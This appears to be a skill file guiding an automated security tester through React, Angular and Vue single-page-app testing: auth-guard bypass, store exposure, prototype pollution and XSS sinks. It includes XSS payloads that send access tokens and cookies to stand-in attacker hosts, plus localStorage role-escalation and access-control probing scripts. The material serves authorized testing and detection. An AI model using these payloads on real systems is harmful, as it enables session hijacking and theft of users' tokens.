---
name: spa-frameworks
description: React, Angular, and Vue SPA-specific security vulnerabilities including dangerouslySetInnerHTML XSS, bypassSecurityTrust, client-side auth guard bypass, Redux/Vuex store exposure, and JWT-in-localStorage escalation
---

# SPA Framework Security Testing (React / Angular / Vue)

## Why SPAs Require Different Testing

SPAs shift critical security logic to the client: routing, auth guards, and data rendering all happen in JavaScript. The key insight is that **frontend protections are advisory only** — the server-side API is the real enforcement boundary. Every auth guard, role check, and hidden UI element in the frontend must be independently verified against the API.

## Universal SPA Patterns (Apply to All Frameworks)

### Client-Side Auth Bypass (Always Test First)

```javascript
// 1. Dump localStorage and sessionStorage via browser_action execute_js
Object.entries(localStorage)
  .concat(Object.entries(sessionStorage))
  .map(([k,v]) => ({key: k, value: v.substring(0, 200)}))
```

Look for: `access_token`, `id_token`, `refresh_token`, `authToken`, `user`, `session`, `role`, `permissions`, `isAdmin`

```javascript
// 2. Try role escalation via localStorage manipulation
localStorage.setItem('role', 'admin');
localStorage.setItem('isAdmin', 'true');
localStorage.setItem('userType', 'administrator');
// Then reload and check if admin UI appears
location.reload();
```

### JWT in localStorage — Critical Escalation

If JWT is found in localStorage:
- **Any XSS vulnerability immediately escalates to Critical account takeover**
- Document as: "XSS + JWT in localStorage = Full Session Hijack"
- The XSS payload needed: `fetch('https://attacker.com/?t='+localStorage.getItem('access_token'))`
- Even a reflected XSS that requires user interaction is Critical in this context

### Frontend vs API Authorization Mismatch

This is the most common high-severity finding in SPAs:

```python
import requests

# Session 1: Admin user — capture all API calls via network capture
# Session 2: Regular user — replay admin API calls with regular user token

admin_endpoints = [
    "GET /api/admin/users",
    "GET /api/admin/audit-logs",
    "POST /api/admin/roles",
    "DELETE /api/users/{id}",
]

regular_user_token = "Bearer eyJ..."  # regular user token
target = "https://target.app"

for ep in admin_endpoints:
    method, path = ep.split(" ", 1)
    r = requests.request(
        method,
        f"{target}{path.format(id='1')}",
        headers={"Authorization": regular_user_token}
    )
    if r.status_code not in (401, 403):
        print(f"BROKEN ACCESS CONTROL: {method} {path} → {r.status_code}")
        print(r.text[:300])
```

### SPA Network Traffic vs API Direct Access

```bash
# Test endpoints directly without going through the frontend
# The frontend might hide a button but the API endpoint is still live

# With curl, bypassing the SPA entirely
curl -s -X GET https://target.app/api/admin/users \
    -H "Authorization: Bearer $USER_TOKEN" | python3 -m json.tool

# Test unauthenticated access to authenticated endpoints
curl -s -X GET https://target.app/api/users/me
# 200 response without token = critical broken auth
```

## React-Specific Vulnerabilities

### dangerouslySetInnerHTML XSS

The React equivalent of `innerHTML` — bypasses React's XSS escaping completely.

**Find in source:**
```bash
grep -n "dangerouslySetInnerHTML" /workspace/main_pretty.js | head -20
# Look for: dangerouslySetInnerHTML={{ __html: userInput }}
# Look for: dangerouslySetInnerHTML={{ __html: props.content }}

# Semgrep rule
semgrep --config=p/react /workspace/source/ --json | \
    python3 -c "import sys,json; [print(f['path'],f['start']['line'],f['extra']['message']) for f in json.load(sys.stdin)['results']]"
```

**Test payloads:**
```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(1)>
<script>alert(1)</script>
<iframe srcdoc="<script>parent.fetch('https://exfil.attacker.com/?c='+document.cookie)</script>">
```

**Impact escalation:** If `dangerouslySetInnerHTML` renders user-controlled content AND JWT is in localStorage → Critical account takeover.

### Redux / Context Store Exposure

```javascript
// Check for Redux DevTools extension bridge (exposed store)
window.__REDUX_DEVTOOLS_EXTENSION__ && console.log('Redux DevTools present');

// Try common store access patterns
const storeKeys = ['__store__', 'store', 'redux', '__STORE__', '_store'];
storeKeys.forEach(k => { if(window[k]) console.log(k, JSON.stringify(window[k].getState()).substring(0,500)); });

// React Query / SWR cache
window.__REACT_QUERY_STATE__ && console.log(JSON.stringify(window.__REACT_QUERY_STATE__).substring(0,500));
```

Look for auth tokens, user roles, PII, or session data in the store state.

### Client-Side Route Guard Bypass

React Router's `<PrivateRoute>` and `<Navigate>` components only control what the frontend renders. The underlying API endpoints are always directly accessible.

```bash
# Map all route paths from the bundle
grep -oE 'path:\s*["\x27][^"\x27]+["\x27]' /workspace/main_pretty.js | \
    grep -oE '["\x27][/][^"\x27]*["\x27]' | tr -d '"\x27' | sort -u

# Then test each "protected" route's underlying API directly
# without the frontend's auth token check
```

### Prototype Pollution via Redux/State Merging

```javascript
// Test if deep merge in state update pollutes Object.prototype
fetch('/api/updateProfile', {
    method: 'POST',
    headers: {'Content-Type': 'application/json', 'Authorization': token},
    body: JSON.stringify({"__proto__": {"isAdmin": true}, "name": "test"})
}).then(r => r.json()).then(d => {
    console.log('isAdmin on empty object:', ({}).isAdmin);  // true = prototype pollution
    console.log('isAdmin on new obj:', new Object().isAdmin);
});
```

## Angular-Specific Vulnerabilities

### bypassSecurityTrustHtml / DomSanitizer Bypass

Angular's `DomSanitizer` blocks XSS, but developers commonly bypass it explicitly.

**Find in source:**
```bash
grep -n "bypassSecurityTrust" /workspace/main_pretty.js | head -20
# Dangerous methods:
# bypassSecurityTrustHtml     → XSS via HTML injection
# bypassSecurityTrustUrl      → javascript: URL injection
# bypassSecurityTrustResourceUrl → iframe/script src injection
# bypassSecurityTrustScript   → direct script injection
# bypassSecurityTrustStyle    → CSS injection

# Semgrep
semgrep --config=p/typescript /workspace/source/ --json | \
    python3 -c "import sys,json; [print(f['path'],f['start']['line'],f['extra']['message']) for f in json.load(sys.stdin)['results'] if 'bypassSecurity' in f['extra']['message']]"
```

**Test:** Inject HTML payloads into any parameter that flows into a `bypassSecurityTrustHtml` call.

### Angular Route Guard (canActivate) Bypass

`canActivate` and `canLoad` guards are frontend-only. Test the underlying API endpoints directly.

```bash
# Find all guarded routes
grep -B5 -A5 "canActivate\|canLoad\|canActivateChild" /workspace/main_pretty.js | \
    grep -oE '"path"\s*:\s*"[^"]*"'

# Direct API test for each guarded route's data endpoint
curl -s https://target.app/api/admin/dashboard -H "Authorization: Bearer $REGULAR_USER_TOKEN"
```

### Angular Universal SSR Injection

If the app uses Angular Universal for server-side rendering:

```bash
# Test URL path reflection in SSR HTML output
curl -s "https://target.app/<script>alert(1)</script>"
curl -s "https://target.app/search?q=<img src=x onerror=alert(1)>"

# Check meta tags and transfer state for injection
curl -s https://target.app | grep -E 'ng-state|__ng_state|transferState'
```

### Angular HTTP Interceptor Token Bypass

Angular HTTP interceptors add auth headers automatically in the browser. Direct API calls skip interceptors entirely.

```bash
# This is the same as the universal API bypass test:
# Call API endpoints directly without Angular's interceptor adding the token
# to verify server-side auth is enforced independently
curl -s https://target.app/api/protected-data  # no auth header at all
```

## Vue-Specific Vulnerabilities

### v-html Directive XSS

Vue's `v-html` renders raw HTML — equivalent to `innerHTML`.

**Find in source:**
```bash
# In .vue files or bundle
grep -n "v-html" /workspace/main_pretty.js | head -20
grep -rn "v-html" /workspace/source/ 2>/dev/null | head -20

# Look for: v-html="userContent", v-html="post.body", v-html="message.text"
```

**Test:** Same payloads as dangerouslySetInnerHTML.

### Vuex Store Exposure

```javascript
// Access Vuex store via Vue DevTools bridge
window.__vue_store__ && console.log(JSON.stringify(window.__vue_store__.state).substring(0,500));

// Vue 3 Pinia store
window.__pinia && console.log(JSON.stringify([...window.__pinia._s.entries()]).substring(0,500));

// Find Vue instance and access store
const vueApp = document.querySelector('#app').__vue_app__;
console.log(JSON.stringify(vueApp.config.globalProperties.$store?.state).substring(0,500));
```

### Vue Router Navigation Guard Bypass

Same principle as React/Angular: `beforeEach` navigation guards only protect client-side navigation.

```bash
# Vue router config extraction
grep -oE "path:\s*'[^']*'" /workspace/main_pretty.js | tr -d "'" | sed 's/path: //' | sort -u
```

## Testing Workflow

```
1. RECON: Download + beautify all JS bundles
   → Find API endpoints (grep for /api/, fetch, axios)
   → Find auth config (clientId, MSAL, Firebase, etc.)
   → Find XSS sinks (dangerouslySetInnerHTML, v-html, bypassSecurityTrust)
   → Find route definitions

2. STORAGE INSPECTION: execute_js to dump localStorage/sessionStorage
   → If JWT found: mark all XSS findings as Critical
   → Try role field manipulation

3. STORE INSPECTION: execute_js to access Redux/Vuex/Pinia store
   → Look for sensitive state (auth tokens, roles, PII)

4. AUTH GUARD BYPASS: For every protected route
   → Identify underlying API endpoint
   → Test with: no token, expired token, wrong-role token

5. XSS SINK TESTING: For every identified sink
   → Trace which user input reaches it
   → Test with standard payload corpus
   → Verify DOM injection

6. PROTOTYPE POLLUTION: Test JSON merge endpoints
   → POST __proto__ payload
   → Check if Object.prototype is polluted

7. API MISMATCH: Compare admin user vs regular user API calls
   → Test all admin endpoints with regular user token
   → Document any 200 responses
```

## Semgrep Quick Analysis

```bash
# Run against extracted source (if source maps available) or minified bundle
semgrep --config=p/javascript \
        --config=p/react \
        --config=p/typescript \
        /workspace/source/ \
        --json -o /workspace/semgrep_results.json 2>/dev/null

# Parse critical findings
python3 << 'EOF'
import json
with open('/workspace/semgrep_results.json') as f:
    data = json.load(f)
critical_rules = ['dangerouslySetInnerHTML', 'bypassSecurityTrust', 'v-html', 'eval(', 'innerHTML']
for result in data.get('results', []):
    msg = result['extra']['message']
    if any(r in msg or r in result['extra'].get('lines','') for r in critical_rules):
        print(f"[{result['check_id']}] {result['path']}:{result['start']['line']}")
        print(f"  {result['extra']['lines'][:100]}")
EOF
```

## Severity Escalation Matrix

| Finding | Base Severity | Escalated If | Escalated Severity |
|---|---|---|---|
| XSS in SPA | Medium | JWT in localStorage | Critical |
| XSS in SPA | Medium | Auth cookie accessible | High |
| Client-side role check bypass | Medium | API has no server-side check | Critical |
| Sensitive data in Redux store | Low | Reachable via XSS | High |
| Prototype pollution | Medium | Leads to XSS or auth bypass | High |
| Source map exposed | Info | Contains secrets/tokens | High |
| v-html / dangerouslySetInnerHTML | Low (no user input) | User-controlled input flows in | High |
